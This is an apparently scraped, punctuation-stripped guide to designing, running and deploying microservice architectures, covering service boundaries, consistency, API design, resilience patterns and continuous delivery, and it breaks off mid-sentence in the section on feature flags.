 Our goal is to get a state of simplified complexity   know that the complexity is there  but have tools and processes to keep it in check   Stating some requirements I m going to strive for   Maximize team autonomy   Create an environment where teams can get more done without having to coordinate with other teams     Create an environment where teams can get more done without having to coordinate with other teams  Optimize for development speed   Hardware is cheap  people are not  Empower teams to build powerful services easily and quickly     Hardware is cheap  people are not  Empower teams to build powerful services easily and quickly  Focus on automation   People make mistakes  More systems to operate also means more things that can go wrong  Automate everything     People make mistakes  More systems to operate also means more things that can go wrong  Automate everything  Provide flexibility without compromising consistency   Give teams the freedom to do what s right for their services  but have a set of standardized building blocks to keep things sane in the long run     Give teams the freedom to do what s right for their services  but have a set of standardized building blocks to keep things sane in the long run  Built for resilience   Systems can fail for a number of reasons  A distributed system introduces a whole set of new failure scenarios  Ensure measures are in place to minimize impact     Systems can fail for a number of reasons  A distributed system introduces a whole set of new failure scenarios  Ensure measures are in place to minimize impact  Simplified maintenance  Instead of one codebase  you ll have many  Have guidelines and tools in place to ensure consistency   The Platform  Service teams need freedom to build what s necessary  At the same time  you need to set some standards to ensure consistency and to manage operational complexity  This means standardizing communications  logging  monitoring and deployment  among others   Your platform is a set of standards combined with tools that makes it easy to create and operate services that meet the standards      it needs a control plane  How will your teams interact with the platform  It s typical to have many different web interfaces for continuous integration  monitoring  logging and documentation  Your teams will need a dashboard as a starting point for all of this  This could be something simple that lists all the services and links to the various internal tools  Ideally  it would also collect data from the internal tools and provide additional value at a quick glance   For organizations that already use team chat solutions  one popular option is to use a custom bot to bring common tasks right into the chat interface  This can be useful for triggering tests and deploys  requesting quick stats about a running service  etc  The chat logs also become an audit trail of past actions   Service Essentials  Within your platform  you ll be running many services  Depending on your size  many can mean tens  hundreds or even thousands  Each service encapsulates a piece of business capability into an independent package  You need to build services that are small enough to keep them focused on a single purpose and big enough to minimize interactions with other services   Independently Developed   Deployed  Service Essentials  Each service should be independently developed and deployed  No coordination should be needed with other service teams if no breaking API changes have been made  Each service is effectively it s own product with it s own codebase and lifecycle   If you find the need to deploy services together  you re doing something wrong   If you have a single codebase for all your services  you re doing something wrong   If you have to send out a warning before each deploy of a service  you re doing something wrong   Watch out for shared libraries  If changes to a shared library require all services be updated simultaneously  then you have a point of tight coupling across services  Carefully understand the implications of any shared library you re introducing   Private Data Ownership  Service Essentials  Once multiple services are directly reading and writing the same tables in a database  any changes to those tables requires coordinated deployment of all those services services  This goes against our prime directive of service independence  Sharing data storage is a sneaky source of coupling  Each service should have it s own private data   Private data also has the advantage of letting you to select the right database technology based on the use cases of the service   Does each service needs it s own data server   Not necessarily  Each service needs it s own database  possibly colocated within a shared data server  The key point it that the services should have no knowledge of each other s underlying database  This way  you can start out with a shared data server and separate things out in the future with just a config change   However  sharing a data server does have it s own complications  Firstly  it becomes a single point of failure that can take down a bunch of services together  This isn t something to take lightly  Secondly  you ve also made it possible for one service to unintentionally impact others by hogging too many resources   Identifying Service Boundaries  Service Essentials  This is a complex one to grasp  Each service should be an autonomous unit that implements a business capability   A service should be loosely coupled  It should have minimal dependence on other services  Any communication it does with other services should be over the exposed public interfaces  API  events  etc   Those interfaces also need to be designed to not expose internal details   A service should have high cohesion  Closely related functionality should stay together in the same service  This minimizes chattiness between services   A service should cover a single bounded context  A bounded context encapsulates internal details of a domain  including any domain specific models   Ideally  you understand your product and business well enough to have identified natural service boundaries  Even if you get it wrong the first time around  loose coupling makes it easy to refactor  i e  combine  split or restructure  services in the future   Wait  about about shared models   Let s dig a little deeper into bounded contexts  You want to avoid creating dumb CRUD services  as that would just result in tight coupling and poor cohesion  Domain driven design introduces the concept of a bounded context that can help us identify sensible service boundaries  A bounded context encapsulates related pieces of a domain together  i e  into a service  in our case   Multiple bounded contexts communicate over well defined interfaces  i e  the APIs  in our case   Although some models may be completely encapsulated within a bounded context  others may have different use cases  and associated attributes  spread across multiple bounded contexts  In this case  each bounded context should own it s attributes related to the model   This needs a concrete example  Consider Enchant  a help desk solution  The core model of the system is a ticket  which represents a customer support request  The ticketing service manages the ticket lifecycle and owns primary attributes  Additionally  there s a reporting service which precalculates and stores statistics that are associated with specific tickets  There are two approaches to storing the ticket specific reporting statistics   Store the statistics in the ticketing service since it ultimately owns the ticket models and the ticket lifecycle  With this approach  the reporting service would need to talk to the ticketing service whenever it wants to do anything with the data  This tightly couples the services together and makes them extremely chatty   since it ultimately owns the ticket models and the ticket lifecycle  With this approach  the reporting service would need to talk to the ticketing service whenever it wants to do anything with the data  This tightly couples the services together and makes them extremely chatty  Store the statistics in the reporting service since it s responsible for reporting related data  With this approach  both services will have a ticket model  just each stores different attributes  This keeps the data close to where it s actually used  It also enables the reporting persistence to be optimized for reporting use cases  However  now the reporting service needs to get notified when a new ticket is created or when changes happen to existing tickets   Storing the statistics in the reporting service better meets the service requirements   loose coupling  high cohesion and each service responsible for it s own bounded context  However  this approach adds some complexity  The reporting service needs to be notified about changes to tickets  This is accomplished by having the reporting service subscribe to an event stream coming out of the ticketing service  keeping coupling between the services to a minimum   But how big can a service be   Micro in microservice has nothing to do with the physical size or lines of code  it s about minimizing complexity  A service should be small enough that it serves a focused purpose  At the same time  it should big enough that it minimizes interservice communication   There s no hard set rule that a service can only be one process  one virtual machine  or one container  A service consists of what it needs to autonomously implement a business capability  This includes external services like data servers for persistence  job queues for asynchronous workers or even caches to keep things fast   Stateless Service Instances  Service Essentials  Instances of a stateless service don t store any information related to previous requests  An incoming request can be sent to any instance of the service  The primary benefit here is simplified operations and scaling  You can run the service behind a simple load balancer  Then  it s easy to add or remove instances as request volumes change  It s also easy to replace a failing instance   That said  many of your services do need to store data of some kind  This data should be pushed into external services like disk bound database servers or memory bound caches   Eventual Consistency  Service Essentials  No matter how you look at it  consistency is hard in a distributed system  Rather than fight it  a better approach to take for a distributed system is eventual consistency  In an eventually consistent system  although services may have a divergent view of the data at any point in time  they ll eventually converge to having a consistent view   If you ve modelled your services well  i e  loose coupling   high cohesion   you ll find that eventual consistency is a good enough default for most use cases  Creating eventually consistent distributed systems is also in line with creating loosely coupled systems  They tend to communicate asynchronously and inherently shield themselves from failures of downstream services   Let s look at an example  For Enchant  there s a ticketing service  that manages customer support requests  and a reporting service  that calculates ticket statistics   The reporting service gets an asynchronous feed of updates from the ticketing service  This means that whenever an update happens in the ticketing service  the reporting service only finds out a few seconds later  During those few seconds  both services have a divergent view of the underlying customer requests  For the reporting use cases  this few second lag is acceptable  As an added advantage  this approach also shields the ticketing service from failures in the reporting service   Asynchronous Workers  Service Essentials  As you embrace eventual consistency  you ll find that not everything needs to be done while the request is blocked waiting for a response  Anything that can wait  and is resource or time intensive  should be passed as jobs to asynchronous workers   This approach   Speeds up the primary request path  Since you re only doing a portion of the total work that needs to get done as part of the request  Spreads loads to easy to scale worker processes  Perfect for an auto scaling setup  where the number of workers changes dynamically based on available work to be done  Reduces error scenarios on the primary service API  When jobs running in async workers fail  they can be retried behind the scenes without forcing the requesting service to wait   Understanding idempotency  I mentioned that jobs can be retried when they fail  The challenge with automatically retrying jobs is that you may not know if the failing job completed its work before it failed or not  To keep things operationally simple  you really want your jobs to be be idempotent  For our context  This means that there should be no negative impact of a job running more than once  The end result should be the same whether the job ran once or more than once   Documentation  Service Essentials  A service  and it s API  is only as good as it s documentation  It s critical to have clear and easy to approach usage documentation for each service  Ideally  usage documentation for all services should be in a common place  Service teams shouldn t have to think too hard about where documentation is for a service they re using   What should happen when the API changes   Notification about changes to documented endpoints need to go out to owners of other dependent services  The notification system should have knowledge of who the current owners are  accounting for any team or ownership changes  This is information that can be tracked and made available by the platform   Load Balancers  Service Essentials  One of the advantages of stateless services is that you can bring up multiple instances of your service  Since there s no per instance state  any instance can handle any request  This is a natural fit for load balancers  which can be leveraged to help scale the service  They re also readily available on cloud platforms   Traditional load balancers are on the receiving end  where the client only knows of one target  That target receives the request and distributes it among multiple  hidden  internal service instances  An alternate approach is a client side load balancer  such as what Netflix has done with Ribbon  With a client side load balancer  the client is aware of the multiple possible targets and chooses a target based on a policy  such as preferring a target that s in the same data center to reduce request latency  A combined approach can also work well  start with traditional load balancers  and add in client side load balancers when you need the advanced routing   Client side load balancers would be included as part of the client libraries   Aggregation Services on Network Boundaries  Service Essentials  A number of additional requirements come in to play when data is crossing private network boundaries for communications with external clients  Data needs to be encoded in certain ways  you want to minimize round trips  you need to have heightened security to ensure these clients can only access what they need to  etc   An aggregation service takes on the role of collecting data from other services  It handles any special encoding or compression requirements and inherently simplifies security efforts as the client would only need to communicate with a single service   Depending on your needs  you may find it practical to build a multiple aggregation services  one for each use case  public API  mobile client  desktop client  etc   If your needs are simpler  a single service may do the trick   Limit the amount of business logic in an aggregation service  As aggregation services work with with data from many other services  it becomes easy to for accidentally sneak business logic into them and reduce cohesion of your services  Watch out for this  Any business logic related to a service should belong to it  Aggregation services area meant to be thin glue layers between external clients and internal services   What if one of the internal services is down   Answering this is very much dependent on your specific context  Some questions to ask   Can the functionality be gracefully removed or does the endpoint need to throw an error   Is the availability of the service critical enough that the whole aggregation service needs to be taken down   If gracefully removed from the endpoint  how would the client show the failure to the user   The nature of an aggregation service is that it s dependent on  and deeply coupled to  one or more other services  Accordingly  it s impacted by failures in any of the services    and things will fail  You need to understand the failure scenarios and have a plan of action in place   Security  Service Essentials  Consider the security needs of a service based on the data it s housing or it s role in the grand scheme of things  You may need data security in transit or at rest  You may need network security at the service perimeter or at the perimeter of your private network  Good security is hard  Here are some principles worth thinking about   Layer your security   Also known as defence in depth  Rather than assuming a network perimeter firewall is good enough  continue to add multiple layers of security where it matters most  This adds redundancy to your security and also helps slow down an attacker when one layer of security fails or a vulnerability is identified     Also known as defence in depth  Rather than assuming a network perimeter firewall is good enough  continue to add multiple layers of security where it matters most  This adds redundancy to your security and also helps slow down an attacker when one layer of security fails or a vulnerability is identified  Use automatic security updates   In many cases  the benefit of automatic security updates outweighs the possibility of a service failure as a result of it  Combine automatic updates with automated testing  and you ll be able to roll out security updates with much higher confidence     In many cases  the benefit of automatic security updates outweighs the possibility of a service failure as a result of it  Combine automatic updates with automated testing  and you ll be able to roll out security updates with much higher confidence  Harden your base operating system   Services typically need minimal access to the base operating system  Accordingly  the operating system can place strong limits on what a service can and cannot do  This helps contain a vulnerability if found in a service     Services typically need minimal access to the base operating system  Accordingly  the operating system can place strong limits on what a service can and cannot do  This helps contain a vulnerability if found in a service  Do not write your own crypto code  It s very hard to get it right and very tempting to think you have something that works  Always use well known   widely used implementations   Service Interactions  A microservice architecture promotes having many small but focused services communicating with each other  This raises a bunch of questions  how should services find each other  Are they all talking a common protocol  What happens when one fails to communicate to another  These are some of the topics that we ll cover as we discuss service interactions   Communication Protocols  Service Interactions  As you build more services  it becomes critical to have standardized methods of communication between them  Since services don t all have to be written in the same language  the chosen communication protocols must be language and platform independent  We ll need to account for both synchronous and asynchronous communications   First  the transport protocol  HTTP is a great choice for synchronous communications  HTTP clients are already available in all languages  HTTP load balancers are built into cloud platforms  The protocol has built in mechanisms for caching  persistent connections  compression  authentication and encryption  Most importantly  there s an ecosystem of robust and mature tools that can be leveraged  caching servers  load balancers  excellent browser based debuggers and even proxies that can replay requests   The one negative of HTTP is that it s a verbose protocol as plain text headers are repeatedly sent and connections are repeatedly created and torn down  Although I could argue that this is a reasonable tradeoff given the significant value that already comes with the HTTP ecosystem  we already have a better option on the horizon  HTTP 2  It effectively solves the verbosity problem by using compressed headers and multiplexing requests over persistent connections  It does all that while maintaining backwards compatibility with older clients  HTTP is here today and will serve well into the future   That said  if you ve achieved enough scale where saving internal transport overhead can make a notable difference to the bottom line  then other transport options may be a better fit   For asynchronous communications  we ll need to implement the publish subscribe pattern  There are two major approaches here   Use a message broker   All services push events to the broker  Other services subscribe to the events they need  In this scenario  the message broker defines it s own transport protocol  Since a centralized broker can easily become a single point of failure  it s important to ensure such a system is fault tolerant and horizontally scalable     All services push events to the broker  Other services subscribe to the events they need  In this scenario  the message broker defines it s own transport protocol  Since a centralized broker can easily become a single point of failure  it s important to ensure such a system is fault tolerant and horizontally scalable  Use webhooks delivered by the services  A service exposes an endpoint from which other services can subscribe to events  It delivers those events as webhooks  i e  an HTTP POST with a serialized message in the body  to a target destination provided at time of subscription  Such webhook deliveries should be sent by asynchronous workers that the service manages  This approach avoids introducing a single point of failure and is inherently horizontally scalable  This functionality can be built right into a service template   What about an Enterprise Service Bus  ESB  or a messaging fabric   The main problem with heavyweight messaging fabrics is they encourage pushing business logic out of the services and into the messaging layer  This lowers service cohesion and adds another layer where complexity builds up accidentally over time  Any business logic related to a service should belong to the service and be managed by the service teams  I strongly recommend sticking to smart services with dumb pipes  This ensures continued autonomy of the teams   Now let s talk about the serialization format  There are two popular contenders here   JSON   A plain text format defined in RFC 7159     A plain text format defined in RFC 7159  Protocol Buffers  an IDL with a binary wire format created by Google   JSON is a stable and widely used serialization format  It s natively parsed in browsers  Debuggers built into the browsers also display it well  Nothing other than a JSON parser serializer is required  which are readily available in all languages  The main negative about using JSON is that the attribute names get repeated in every message  resulting in an inefficient use of the transport  Compression on the transport protocol can significantly mitigate this   Protocol buffers are efficient to parse  efficient over the wire and heavily battle tested at Google  However  they do require language specific parser serializer generators based on a message definition files  Language support isn t as wide as JSON  though most modern languages are covered  Servers must also share the message definition files with clients in advance   JSON is easier to get started with and more universal  Protocol buffers keep things leaner and faster but come with a little additional development overhead in sharing and compiling  proto files  Both are good options  Pick one and use it consistently   Definition Of Unhealthy Service  Service Interactions  As we ll need automated monitoring and alerting  it s a good idea for all services to agree on what it means for a service to be unhealthy   For an HTTP transport protocol  this one is pretty easy  Services are expected to generate 200  300   400 series HTTP status codes  Any 500 error codes or timeouts can be assumed to be a result of a service failure  This is also inline with reverse proxies and load balancers  which will throw a 502  Bad Gateway  or 503  Service Unavailable  if they re unable to communicate with the backend instance   API Design  Service Interactions  A good API is easy to use and understand  It provides enough to get the job done without exposing underlying implementation details  It evolves with minimal impact to existing consumers  API design is as much an art as it is a science   We ve already chosen HTTP as our transport protocol  To unlock the full potential of HTTP  you ll need to combine HTTP with REST  A RESTful API provides resourceful endpoints which can be operated on using verbs like GET  POST and PATCH  I ve written a post on RESTful API design which covers the design of public facing APIs in depth  Much of that post is also relevant to microservice API design   But why should service APIs be resource oriented   It leads to consistency and clarity across your service APIs  There s an obvious way to retrieve or search for things  Instead of trying to find the method that modifies a specific attribute of a resource  it s always just a PATCH  a partial update  to the resource  This leads to fewer endpoints on the API  which helps in further reducing complexity   Since most modern public APIs are RESTful  there s also a healthy ecosystem of tools that can be used  This includes client libraries  test automation tools and introspecting proxies   Service Discovery  Service Interactions  In an environment where service instances come and go  hard coding IP addresses isn t going to work  You will need a discovery mechanism that services can use to find each other  This means having a source of truth for what services are available  You ll also need some way to utilize that source of truth to discover and balance communication to the services instances   The service registry  This is your source of truth  It contains information about the available services and their network locations  Given the critical nature of this service  it s a single point of failure   it needs to be extremely fault tolerant   There are a two approaches to getting your services registered with the service registry   Self registration   a service can register itself during startup and send updates as it goes through different lifecycle phases  initializing  accepting requests  shutting down  etc   It will also need to send regular heartbeats to the registry to let it know that it s still available  The registry can then automatically mark the service as down if it doesn t get a heartbeat  This is a good candidate for inclusion into a service template     a service can register itself during startup and send updates as it goes through different lifecycle phases  initializing  accepting requests  shutting down  etc   It will also need to send regular heartbeats to the registry to let it know that it s still available  The registry can then automatically mark the service as down if it doesn t get a heartbeat  This is a good candidate for inclusion into a service template  Externally monitored  an external service keeps an eye on service health and updates the registry accordingly  This is approach adopted by many microservice platforms  which typically take on the role of service lifecycle management   In the greater scheme of things  the service registry can also be the source of state used by the monitoring system or system visualization tools   Discovery and load balancing  Having a working registry is only half of the problem  You also need to actually use it for services can discover each other dynamically  There are two main approaches here   Smart servers   The client makes a request to a known load balancer  which has knowledge of instances that it has retrieved through the registry  This is the traditional approach  but does mean all traffic runs through load balancer endpoints  Server side load balancers come standard on cloud platforms     The client makes a request to a known load balancer  which has knowledge of instances that it has retrieved through the registry  This is the traditional approach  but does mean all traffic runs through load balancer endpoints  Server side load balancers come standard on cloud platforms  Smart clients  The client discovers a list of instances via the service registry and decides which to connect to  This removes the need for a load balancer altogether and has the added benefit of spreading out network traffic more evenly  Netflix has taken this approach with Ribbon which also handles advanced policy based routing  To utilize this approach  you ll need the discovery and balancing functionality in your language specific client libraries   A simplified discovery mechanism using load balancers and DNS  An easy way to get a rudimentary service discovery setup going on most cloud platforms is to use a DNS entry for each service that points to a load balancer  The load balancer s list of registered instances becomes your service registry and the DNS lookup becomes your service discovery mechanism  Unhealthy instances are automatically removed by the load balancer and re added when they re healthy again   Decentralized Interactions  Service Interactions  There are two main approaches for implementing complex workflows where multiple services need to coordinate together  using a centralized orchestrator or using decentralized interactions   With a centralized orchestrator  a process coordinates with multiple services to complete a larger workflow  The services have no knowledge of the workflow or their specific involvement in it  The orchestrator takes care of the complexities  For example  enforcing the order in which services complete their work or retrying if a request to a service fails  To ensure the orchestrator knows what s going on  communications tend to be synchronous  The challenge with an orchestrator is that business logic will build up in a central place   With decentralized interactions  each service takes full responsibility for its role in the greater workflow  It will listen for events from other services  complete it s work as soon as possible  retry if a failure occurs and send out events upon completion  Here  communications tend to be asynchronous and business logic stays within the related services  The challenge with this approach is tracking progress of the workflow as a whole   Decentralized interactions meet our requirements better  loose coupling  high cohestion and each service responsible for it s own bounded context  All of this ultimately improves team autonomy  A service that monitors events coming out of all the coordinating services can passively track the state of the workflow as a whole   Versioning  Service Interactions  Change is inevitable  What s important is how well the change is managed  Versioning your API and supporting multiple versions simultaneously goes a long way to minimizing impact to other service teams  This gives them time to update their code on their own schedule  Every API should be versioned   That said  maintaining old versions indefinitely can be challenging  Old versions should be supported for a few weeks to a few months at most  whatever is reasonable for your organization  This gives other teams the time they need without further impacting your own development speed   How about maintaining multiple versions as separate services   Although this sounds like a good idea  it really isn t  An entirely new service also comes with it s own overhead  You ll have more things to monitor and more things that can fail  Bugs found in old versions will likely need to be fixed in new versions too   It gets even more complicated if all versions of the service need a shared view of the underlying data  You could have them all talking to the same database  but that would be another bad idea  They would all be strongly coupled to the persistence schema  Any changes to the schema in any version can cause unintended breakage in other versions  You end up having to keep multiple code bases in sync   So how should multiple versions be maintained   All supported versions should co exist in the same codebase and the same service instances  Use a versioning scheme to identify which version a request is for  When possible  old endpoints should be updated to relay modified requests to the equivalent new endpoints  Although having multiple versions co exist in the same service doesn t eliminate the complexity  it avoids accidental complexity and tackles the inherent complexity head on   Limit Everything  Service Interactions  A service that fails cleanly and quickly is better than one that s slowing everybody down because it s overloaded  All types of requests should have consumer specific limits in place  You ll also need a way to increase the limits for specific consumers as needed  This ensures stability of a service as it s team will have an opportunity to plan for large usage increases   While such limits are most important for services that can t rapidly auto scale  it s still a good idea for those that can  You don t want to be learning about the limits of your design decisions by surprise  That said  limits for auto scaling services can be quite liberal   Limit management interfaces could be built into service templates or provided as a centralized service at the platform level to enable self service management by service teams   Connection Pools  Service Interactions  Sudden spikes in request volume can make a service hammer another downstream service and pass the pain down the chain  Connection pools help smooth out the impact from sudden short term spikes in request volumes  A reasonable pool size limits the number of requests you ll make to the downstream service at any time   Have a separate connection pool for each service you need to communicate with  This will isolate a fault in a downstream service to a specific part of your system      and remember to fail fast  If a connection from the pool can t be acquired  it s better to fail fast rather than blocking indefinitely  This limits how long other services are waiting on yours  The failures will alert the team and raise some useful questions  Is it time to add capacity  Is the downstream service experiencing an outage   Short Timeouts  Service Interactions  Imagine this scenario  One service gets overloaded with requests and slows down  As a result  all services calling it slow down  This pain continues to trickle upwards and eventually the user interfaces are lagging  The users aren t seeing the responses they expect and start clicking erratically in an attempt to fix things  sadly  this really happens  which only compounds the pain  This is a cascading failure  Many services failing and raising alerts at the same time  You really don t want to experience this first hand  trust me   With multiple services backing up and failing  identifying the source of the problem becomes a challenge  Is a service having an internal problem or is it a result of a downstream service  Using short timeouts on downstream API calls can help in this scenario  Timeouts prevent multiple services from just slowing down  Instead  you ll have one service really failing and other services failing fast and pointing to it   Now  it s not good enough to just have a default 30 second timeout  You need a timeout that tightly covers what s reasonably expected of a downstream service  For example  if you expect a service to respond within 10   50 milliseconds  than any timeout over 500 milliseconds is already more than enough   Tolerate Unrelated Changes  Service Interactions  Service APIs will evolve over time  A change that requires coordination with API consumers is slower to release than one that requires no coordination  To minimize coupling  services should be able to tolerate unrelated changes to responses of services they communicate with  This just means they shouldn t break if a field is added or an unused field is changed removed   If all services tolerated unrelated changes  additive API changes could be made without any coordination  Unrelated breaking changes would just require consuming service teams to run through their test suite to verify everything is still working   Circuit Breakers  Service Interactions  Every attempt to communicate with a failing resource has a cost  It uses resources on the consumer side to try to make a request  it uses up network resources and it uses up resources on the target side   A circuit breaker prevents requests that are doomed to fail from even being attempted  Implementing this is straight forward  if requests to a service are resulting in a high number of failures  flip a flag and stop trying to send requests to service for a period of time  Periodically allow a single request through to see if the service is back online  so you can flip the flag back   Circuit breaking logic should be wrapped up in a client library that s included as part of the service template   Correlation IDs  Service Interactions  A single user request can result in activity occurring across many services  which makes things difficult when trying to debug the impact of a specific request  One way to make things simpler is to include a correlation ID in service requests  A correlation ID is a unique identifier for the originating request that is passed by each service to any downstream requests  When combined with a centralized logging layer  this makes it really easy to see a request make it s way through your infrastructure   The IDs are generated by either user facing aggregation service or by any service that needs to make a request that s not an immediate side effect of an incoming request  Any sufficiently random string  like a UUID  would do the trick   Maintaining Distributed Consistency  Service Interactions  In an eventually consistent world  a service can synchronize data with another service by subscribing to its feed of events   While this sounds easy enough  the devil is in the details  Your database and event stream are likely two different systems  making it extremely difficult to atomically write to both systems and thus hard to guarantee eventual consistency   You could use a local database transaction to wrap the database operation and write to an event table at the same time  Then  the event publisher would just read from the event table  But not all databases support such transactions  You could have your event publisher read from your database s commit log  But not all databases expose such logs       or you could just allow the inconsistency and fix it later  Consistency is very hard in a distributed system  Even database systems for which distributed consistency is a core feature struggle to get it right  Rather than fight an uphill battle  you could just have a best effort synchronization solution combined with a process which identifies and corrects inconsistencies after the fact   This approach is still eventually consistent  It s just that the window of inconsistency may be a little longer than if you had taken on the complexity of guaranteeing cross system  database   event event stream  consistency   Every piece of data should have a single source of truth  Even if you have to duplicate some data across multiple services  one service should always be the source of truth for any piece of data  All updates should go through the source of truth  This also becomes the originating source against which consistency verification can be done in the future   What if we need some services to be strongly consistent   First  I d double check that you ve got the service boundaries right  When services need to be strongly consistent  it usually also makes sense to colocate the data into a single service  and a single database   making it simpler to provide transactional guarantees   If you re sure you have the right service boundaries but still need strong consistency  then you ll need to look at distributed transactions  which are difficult to implement correctly and would also strongly couple the two services together  This should be your last resort   Authentication  Service Interactions  All API requests should be authenticated  This helps service teams better analyse usage patterns and provides an identifier which can be used to manage consumer specific limits   The identifiers would be unique API keys provided by the service team to consumers who use the service  You ll need some way to issue and revoke these API keys  This could either be built into the service template or be provided as a centralized authentication service at the platform level to enable self service management of keys by service teams   Auto Retry  Service Interactions  When you re failing fast  it makes sense to automatically retry certain kinds of requests  This is especially the case for asynchronous communications   A service that s down can easily get hammered when it comes back online if a bunch of other services were retrying at the same retry window  This is also known as a thundering herd  which can be easily avoided this by using randomized retry windows  If your infrastructure doesn t implement circuit breakers  I recommend combining randomized retry windows with an exponential backoff to further spread out requests   What if there s a permanent failure   Sometimes the failure is a result of a malformed request and not just the target service being down  In such a situation  no matter how many times you retry  the request isn t going to succeed  Such requests should be sent to a dead queue for investigation after a number of failed retries   Communicate Only Via Exposed APIs  Service Interactions  Communication between services should only happen through established communication protocols  No exceptions  If you find you have a service talking directly to the database of another service  you re doing something very wrong   As an added bonus  when you can make universal assumptions about how services communicate  it becomes easy to secure the rest of the service components behind strong firewalls   Economic Forces  Service Interactions  When a team is using a service provided by another team  they tend to assume it s free  While it may be free for them to use  there are real costs to the other team and to the organization  In order to make effective use of the available resources  teams need to understand the cost of a service   One powerful way to pull this off is to have services invoice other services for usage  Not using a made up points system  Invoice using real cash  A service should pass on the cost of development and operations to it s consumers  The true cost of a service includes development costs  infrastructure costs  and costs to use other services  This can all be flattened into a simple per request price that s adjusted periodically  once or twice a year  as request volumes and costs change   When the cost of using a service is transparent  developers are better equipped to see what s right for their service and the organization   Client Libraries  Service Interactions  There are a lot of little things that need to be managed when talking to other services  For example  discovery  authentication  circuit breaking  connection pools and timeouts  Rather than each team rewrite this stuff from scratch  it should be packaged up into a client library with sensible defaults   Client libraries shouldn t include any service specific business logic  It s scope should be limited to auxiliary concerns like connectivity  transport  logging and monitoring  Also  be aware of the risks of shared libraries   Development  Source Control  Development  Each service should have it s own repository  This keeps checkouts small  source control logs clean and enables granular access control  You re not deploying services together and shouldn t be colocating their code either   Additionally  standardize on a source control technology  This will keep things simple for your teams and make your continuous integration and continuous delivery efforts easier   Development Environments  Development  Developers need to be able to work quickly on their computers  To ensure a consistent environment on any operating system  the development environments should be packaged as virtual machines   However  given the complexity and number of services involved in a microservice approach  it may not be practical to bring everything up on a single developer machine  In that case  the service that is developed and running locally could be combined with an isolated environment running in the cloud  The developer would be able to quickly iterate in their development environment while testing against other services running in the cloud  Note that isolation is critical for such cloud environments  Shared environments between developers will only cause confusion as a result of unexpected changes   Continuous Integration  Development  Integrate working code to the mainline branch as soon as possible  Updates to the mainline branch should trigger automated builds on the continuous integration system  The builds should trigger automated tests to verify that the build is in good shape   Since these automated tests aren t running on the developer s computer  it becomes feasible to run more complex and time consuming tests on the continuous integration system  Popular solutions in the space keep things running quickly by executing tests in parallel across a cluster of machines   If all the tests pass  the continuous integration system should release the deployment package to the automated deployment system   So what do you gain   With code getting integrated quickly  everybody has visibility of changes that are being made  Any conflicts created as a result of multiple people changing the same code are identified quickly and are resolved sooner   With full test suites running often  bugs are identified sooner   Most importantly  when there are few changes per iteration of integration  one can be much more confident of the correctness of those changes   Continuous integration speeds up your team s ability to deliver quality software   Continuous Delivery  Development  The goal of continuous delivery is to release smaller sets of changes faster  Rather than tackle a large piece of work in one go  break it down into smaller chunks that can be completed and released one after another  You want to keep the system in a working state along the way   Small releases are great  They are easy to test  They simplify code review efforts  It s much easier to confidently release and deploy small sets of changes   To pull off continuous delivery  you will need to rapidly run through build  test and development cycles  This means you ll need to build out solid continuous itegration and automated deployment pipelines   But won t end users then see incomplete features   With feature flags you ll be able to release features to specific sets of users when you re ready  This lets you deploy changes in smaller chunks without the user seeing incomplete features   Risks Of Shared Libraries  Development  The biggest challenge with shared libraries is that you have little control of when updates will get deployed across the services that use them  It could take days or weeks before other teams deploy the updated library  In an environment where services are independently developed and deployed  any change that requires all services to be simultaneously updated is just not practical   The best you can do is post a deprecation schedule and coordinate with the service teams to ensure the updates get applied in a timely manner  As a result  any changes to shared libraries also need to be backwards compatible   If it s not already obvious  shared libraries are ideal for managing auxiliary concerns like connectivity  transport  logging and monitoring  Service specific business logic should also stay out of shared libraries   Service Templates  Development  In addition to their core business logic  services need to manage a number of additional supplementary tasks  Some examples include  service registration  monitoring  client side load balancing  limit management and circuit breaking  Teams should be provided with templates which can be used to quickly bootstrap services which handle all these common tasks and integrate well into your platform   Should using a template be required   The templates should exist to speed teams up and not to enforce structure  However  certain behaviours should be required  like those to enable registration  monitoring and logging  Leave it to the team to decide if building something from scratch that meets behavioural requirements makes more sense than using the readymade template   So we can create a template for every popular tech stack   Although  microservices enable a polyglot architecture  it s important to not get carried away  There are a number of benefits of only supporting a limited set of technologies   Your teams won t need to reimplement the tools for each stack  making it easier to focus on building robust standardized tools   It enables cross team code reviews   Most importantly  it makes it easy for developers to move between teams   You should have templates available for each supported stack   Service Replaceability  Development  As the usage of a service grows  you ll eventually hit limits of your architectural design  By then  you should have learned enough about the specific needs and patterns of the service to be able to implement a more scalable solution than last time around  The great thing about simple and focused services is that they re also easy to replace   Perhaps you d like to switch to a specialized databased  or perhaps to a different language stack  As long as you maintain the documented interfaces  APIs and event streams   you can swap out a complete implementation without impacting other services      or perhaps you want to change everything  including the API  In that case  you would create a new service altogether  Have any consumers of the existing service migrate over and remove the existing service when it s not being used anymore   Deployment  Deployment Package  Deployment  A standardized deployment package is an important building block for an automated deployment pipeline   Your deployment package should have the following properties   Can be deployed anywhere   the same package  without changes  should be deployable to any environment  Development  staging or production     the same package  without changes  should be deployable to any environment  Development  staging or production  External configuration secrets   Configuration and secrets shouldn t be stored within the package  Instead  they should be provided to  or retrieved by  the package at startup     Configuration and secrets shouldn t be stored within the package  Instead  they should be provided to  or retrieved by  the package at startup  Isolated deployments  If multiple services share the same resources  it s easy for a service to accidentally consume an unfair amount of resources and cause unintentional impact on other services  Isolating each deployed service minimizes such impact   A system image fits these requirements well  A versioned system image would be created for each service  Every update to that service would result in a new image  The system image could be for a physical machine  a virtual machine or a container  They all have the ability to limit and monitor resources  memory  cpu  network  etc  that the system consumes  which gives us what s needed to provide a certain level of isolation between the services  You re effectively running a single service per host   Immutable infrastructure for the win  When your deployment package is a system image  you never update a running system in place  It s just replaced by a system built from a newer image  This approach improves confidence and reliability as you test the exact the same image that you ll be deploying to production  It also avoids configuration drift as a result of direct changes to production environments   Automated Deployment  Deployment  Developers should have a common way to trigger automated deployments for any version of any service to any environment  Keeping deployment fully automated and simple makes it easy to confidently deploy small changes often   Aim for zero downtime updates  If a service has to be taken down to apply an update  then every update would send little shock waves across other services  To avoid such mini disruptions  which would discourage frequent deployment   you need a way to gracefully update a service with no downtime   One approach is to use a rolling restart  which would update and restart one instance at a time behind a load balancer  Although a sound approach  you effectively need to run through a full rolling restart again if a problem is found and a rollback is needed   A more robust approach is one where instances running the new version are brought up beside the original version  but serving no requests  The load balancers are then switched over to the instances running the new version  while keeping the existing version instances around for a period of time in case a quick rollback is needed  This is a powerful approach made possible on cloud environments where additional resources can be used temporarily   Feature Flags  Deployment  A feature flag is code that lets you turn on or off specific features at run time  effectively decoupling code deployment from feature deployment  This enables you to deploy the code for a feature incrementally over a period of 